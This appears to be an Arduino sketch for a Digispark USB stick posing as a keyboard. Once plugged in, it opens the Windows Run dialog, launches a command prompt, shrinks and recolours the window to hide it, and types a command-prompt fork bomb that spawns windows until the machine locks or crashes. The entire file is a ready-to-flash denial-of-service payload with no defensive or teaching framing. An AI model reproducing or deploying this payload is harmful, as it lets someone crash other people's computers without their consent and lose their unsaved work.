//This script opens up a Windows command prompt and makes it open up another instance of itself and so on until the machine can take it no more and either locks or crashes. Credits to BlackBoot.
#include "DigiKeyboard.h"
void setup() 
{
  //nothing required in this function
}

void loop() {
  DigiKeyboard.sendKeyStroke(0); //initialising the keyboard
  DigiKeyboard.delay(500); //wait half a second
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  //Obfuscate the terminal
  DigiKeyboard.print("MODE CON: COLS=15 LINES=1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("COLOR EF");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //Run the fork bomb
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("for /l %x in (1,1,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) do start"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) 
  {
    /*Stops the digispark from running the scipt again*/
  }
}
